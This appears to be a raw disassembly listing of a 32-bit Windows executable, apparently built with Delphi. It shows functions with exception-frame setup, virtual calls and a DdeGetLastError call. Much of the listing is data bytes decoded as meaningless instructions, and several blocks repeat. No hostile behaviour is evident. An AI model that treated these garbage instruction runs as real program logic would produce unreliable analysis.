mov eax [ ebp - 0x4 ]
call sub_4878e8
mov eax [ ebp - 0xc ]
push eax
push [ rw-data ]
push r-xdata
mov eax [ ebp - 0x4 ]
push [ eax + 0xe0 ]
push r-xdata
mov eax [ ebp - 0x4 ]
push [ eax + 0xd8 ]
lea eax [ ebp - 0x10 ]
mov edx 0x5
call sub_404498
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
pop edx
call sub_48762c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xf4 ] 0x2
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xf0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xf4 ] 0x2
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48779a
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
retn
sub_487766
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
call sub_403af8
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48779a
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
retn
sub_4877a7
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_484f4c
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4867a0
mov [ esi + 0xf8 ] eax
mov edx 0x8f
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
xor eax eax
mov [ esi + 0xf0 ] eax
mov [ esi + 0xf4 ] 0x1
mov [ esi + 0x108 ] 0x0
mov [ esi + 0xfc ] 0x2f
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_487828
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4878dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4878e4
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40413c
retn
xor eax eax
push ebp
push sub_48789a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4878e8
mov edx [ ebp - 0x8 ]
mov ecx [ rw-data ]
mov eax [ ebp - 0x4 ]
call sub_48762c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_47b300
mov eax [ ebp - 0x4 ]
mov [ eax + 0xf4 ] 0x1
retn
sub_4878e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48793a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ ebx + 0xf0 ]
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0xf0 ]
call sub_40850c
mov ecx [ ebp - 0x4 ]
mov eax esi
mov edx r-xdata
call sub_404424
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487941
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_48794b
inc [ ecx ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
lea eax [ esi + 0xf8 ]
call sub_40d814
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47cbc0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_487984
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_487a14
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487a1b
retn
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
mov ecx 0x6
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
mov ecx 0x23
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
mov ecx 0xf
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
mov ecx 0x19
mov edx [ r-xdata ]
call sub_404bb4
sub_487ab8
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403a98#9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487ae4
retn
sub_487af3
add [ ebx ] al
or [ esp + eax * 2 + 0x61 ] edx
je r-xdata
jae r-xdata
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al dh
jpe r-xdata
add al 0x11
or [ si + 0x53 ] dl
je r-xdata
add [ esp ] cl
inc ecx
jne r-xdata
add [ eax ] cl
add [ eax ] ch
jl r-xdata
add ah dl
pop ds
inc edx
inc eax
add [ eax - 0x74ffbe97 ] cl
shl [ ebx + edi * 2 + 0x48 ] 0x0
add [ eax ] al
add [ eax ] al
add ah ah
jpo r-xdata
imul ebp [ esi + 0x67 ] 0x11040073
add [ esp + edi * 2 ] dl
dec eax
add al cl
add [ eax ] al
add [ ebx + esi * 2 + 0x41 ] ch
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
outsd
insd
popad
je r-xdata
add al cl
xchg edi eax
dec eax
add ah bl
push ds
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ ecx ] cx
dec ebp
popad
outsb
jne r-xdata
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax ] dh
add [ esi ] al
jl r-xdata
insb
push es
inc esp
dec ebp
popad
outsb
mov eax eax
xor [ ebx + 0x48 ] bh
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x61 ]
arpl [ edx + 0x6f ] si
inc ebp
jbe r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x72 ] bh
dec eax
add al bl
xchg ebx eax
inc ecx
add [ eax - 0xbffb772 ] bh
pushad
xor eax 0x35540040
inc eax
outsb
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ ebx ] al
dec ebp
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x3 ] si
xchg edx eax
inc ecx
add ah dh
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
outsb
jae r-xdata
sub_487d36
mov eax 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060008 ] al
outsb
dec edi
jo r-xdata
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
outsb
nop
pushfd
jge r-xdata
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
jge r-xdata
add ah cl
push ds
inc edx
add ah dh
jge r-xdata
add [ ecx + ebx * 4 + 0x1edc0048 ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bl
jge r-xdata
add ah ch
add [ eax ] cl
add [ eax ] al
insb
jae r-xdata
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax + ebx * 4 ] bh
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
lea eax [ eax ]
hlt
in al dx
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffb768 ] al
sub_487fac
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
pop es
dec edi
outsb
inc ebx
insb
outsd
jae r-xdata
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ esi + ebx * 4 ] ch
dec eax
add al bl
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
sub al 0x7b
dec eax
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0004 ] al
outsb
inc ebp
js r-xdata
xor [ eax ] al
add bh bh
les ebx [ esi + 0x10048 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add eax 0x656e694c
jb r-xdata
add [ eax + 0x1edc0048 ] al
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add al ah
popfd
arpl [ ebp + 0x74 ] si
dec ebp
popad
arpl [ edx + 0x6f ] si
nop
cmp al 0x80
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4880 ] cl
add [ eax ] al
sahf
dec eax
add [ ecx ] al
add [ eax ] bh
add [ eax ] al
pop ebp
inc ecx
jbe r-xdata
je r-xdata
call 0x4048c294
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
jb r-xdata
add [ ebx ] 0x0
insd
nop
mov [ eax + 0xe070048 ] al
push esp
inc esp
push ebx
jb r-xdata
fcomp [ esi ]
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edi + eax * 4 + 0xe0048 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
nop
movsb [ edi ] [ esi ]
or [ eax ] 0x0
add [ eax ] al
add [ eax ] al
aam 0x81
dec eax
add ah dh
or [ eax ] 0x0
outsd
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
out 0x81 al
add ah dl
or [ eax ] r-xdata
add [ eax ] al
add [ eax ] al
mov [ ecx + 0x41 ] ch
add [ eax ] dh
add [ eax ] al
inc esp
jae r-xdata
add [ 0x656e694c ] al
jb r-xdata
dec eax
add [ eax + eax ] cl
add [ ebx + esi * 2 + 0x41 ] ch
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + ecx * 4 - 0x6c27ffb8 ] bl
shl ah 0x81
and al [ edx ]
loopne r-xdata
js r-xdata
adc [ eax ] al
insb
sahf
dec eax
add [ eax + 0x100489e ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040003 ] al
add al 0x54
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
je r-xdata
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
dec eax
add al bl
xchg ebx eax
or [ eax ] r-xdata
add al [ eax ]
push es
inc esp
dec ebp
popad
outsb
add [ eax ] al
pop esp
or [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 + 0x48 ] bl
add [ eax + eax ] cl
add [ eax ] al
in al dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + eax * 4 + 0x48 ] ch
add [ eax + eax * 4 + 0x48 ] dh
add [ eax + eax ] cl
add [ ebx + esi * 2 + 0x41 ] ch
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
dec eax
add [ ecx ] al
add bh ch
push [ eax - 0x60 ]
dec eax
add [ esi ] cl
push esp
inc esp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c050004 ] al
imul ebp [ esi + 0x65 ] 0x415de873
insd
cmp al 0x80
dec eax
add [ eax + 0x74 ] ch
inc ecx
add [ edi ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add eax 0x487f5c00
add [ eax + eax ] dh
add bh bh
pop esp
sahf
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530a0002 ] al
jb r-xdata
add [ eax ] al
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ecx ] cl
inc ebp
inc esp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ edx ] cl
dec edi
outsb
push eax
outsd
imul esp [ ebp + 0x44 ] 0x61
je r-xdata
jb r-xdata
sub al 0xa2
jb r-xdata
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edi + 0x48 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x340040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
outsd
jb r-xdata
nop
0x93d80048 0x41
loopne r-xdata
jb r-xdata
dec eax
add al bl
xchg ebx eax
add [ eax ] al
add [ edx + 0x48004883 ] bh
add [ eax ] al
add [ ebx + esi * 2 + 0x41 ] ch
add ah ch
je r-xdata
dec eax
add [ edi ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dh
or [ eax ] 0x40
add [ eax ] al
add [ ebx + esi * 2 + 0x41 ] ch
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edi - 0x6c27ffb8 ] ch
shl [ edx + eax * 4 + 0x48 ] 0x0
add [ eax ] al
add [ eax ] al
add ah ah
or [ eax ] 0x8
or [ eax ] 0x0
jb r-xdata
inc ecx
add ah dh
xchg edx eax
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x7c ] bl
dec eax
add [ eax + eax ] dl
add [ eax ] al
jl r-xdata
outsd
outsb
jbe r-xdata
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edx ] ch
insd
nop
or [ ebx + 0xc070048 ] al
push esp
inc esp
push ebx
jb r-xdata
inc ecx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
outsd
outsb
jbe r-xdata
call sub_409280
jmp r-xdata
insd
nop
inc ecx
add [ ecx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] eax
xchg esp eax
adc [ eax ] al
add al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
and [ edx ] eax
in al dx
int3
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add al ch
mov eax [ 0xe0048 ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
jb r-xdata
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
insb
test [ eax ] cl
pop es
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0x843c6d65
dec eax
add al dh
adc [ eax ] al
add al 0x0
or [ eax ] 0x68
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4885a5
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
je r-xdata
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffb766 ] dl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
cmp al 0x84
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7c ] cl
dec eax
add [ esp + eax * 4 + 0x48 ] ch
add [ eax ] al
add [ eax ] al
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
insd
mov ah 0x82
dec eax
add [ eax + 0x74 ] ch
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
js r-xdata
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
cmpsd [ esi ] [ edi ]
dec eax
add al bl
xchg ebx eax
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffb77d ] ch
or [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_488117
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0800
inc ebx
push 0x65676e61
call 0x4048c294
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ edx ] cl
dec edi
outsb
push eax
outsd
imul esp [ ebp + 0x44 ] 0x61
je r-xdata
fcomp [ esi ]
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edi + eax * 4 + 0xe0048 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
nop
movsb [ edi ] [ esi ]
or [ eax ] 0x0
add [ eax ] al
add [ eax ] al
aam 0x81
dec eax
add ah dh
or [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
out 0x81 al
dec eax
add [ eax + eax ] cl
add [ ebx + esi * 2 + 0x41 ] ch
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + ecx * 4 - 0x6c27ffb8 ] bl
shl ah 0x81
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
dec eax
add al bl
xchg ebx eax
or [ eax ] r-xdata
add al [ eax ]
push es
inc esp
dec ebp
popad
outsb
add [ eax ] al
pop esp
or [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 + 0x48 ] bl
add [ eax + eax ] cl
add [ eax ] al
in al dx
jae r-xdata
add [ eax ] al
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ecx ] cl
inc ebp
inc esp
inc ebp
jb r-xdata
sub al 0xa2
jb r-xdata
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edi + 0x48 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x340040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
outsd
jb r-xdata
nop
0x93d80048 0x41
loopne r-xdata
jb r-xdata
dec eax
add al bl
xchg ebx eax
add [ eax ] al
add [ edx + 0x48004883 ] bh
add [ eax ] al
add [ ebx + esi * 2 + 0x41 ] ch
add ah ch
je r-xdata
dec eax
add [ edi ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dh
or [ eax ] 0x40
add [ eax ] al
add [ ebx + esi * 2 + 0x41 ] ch
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edi - 0x6c27ffb8 ] ch
shl [ edx + eax * 4 + 0x48 ] 0x0
add [ eax ] al
add [ eax ] al
add ah ah
or [ eax ] 0x8
or [ eax ] 0x0
jb r-xdata
inc ecx
add ah dh
xchg edx eax
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x7c ] bl
dec eax
add [ eax + eax ] dl
add [ eax ] al
jl r-xdata
outsd
outsb
jbe r-xdata
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edx ] ch
insd
nop
or [ ebx + 0xc070048 ] al
push esp
inc esp
push ebx
jb r-xdata
inc ecx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
outsd
outsb
jbe r-xdata
call sub_409280
jmp r-xdata
insd
nop
inc ecx
add [ ecx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] eax
xchg esp eax
adc [ eax ] al
add al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
and [ edx ] eax
in al dx
int3
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add al ch
mov eax [ 0xe0048 ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
jb r-xdata
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
insb
test [ eax ] cl
pop es
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0x843c6d65
dec eax
add al dh
adc [ eax ] al
add al 0x0
or [ eax ] 0x68
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4885a5
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
je r-xdata
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffb766 ] dl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
cmp al 0x84
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7c ] cl
dec eax
add [ esp + eax * 4 + 0x48 ] ch
add [ eax ] al
add [ eax ] al
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
insd
mov ah 0x82
dec eax
add [ eax + 0x74 ] ch
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
js r-xdata
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
cmpsd [ esi ] [ edi ]
dec eax
add al bl
xchg ebx eax
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffb77d ] ch
or [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4884ac
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor edx edx
push ebp
push sub_48859e
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4885a5
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov ebx eax
mov eax ebx
add eax 0xffffbff9
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_409280
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405f7c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_409280
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405f7c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_409280
sub_4885ac
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
xor edi edi
mov eax esi
sub eax 0x1062
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_488954
mov edi eax
and edi 0x7f
jmp r-xdata
sub eax 0x1080
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_488a08
mov edi eax
jmp r-xdata
sub eax 0x5f90
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
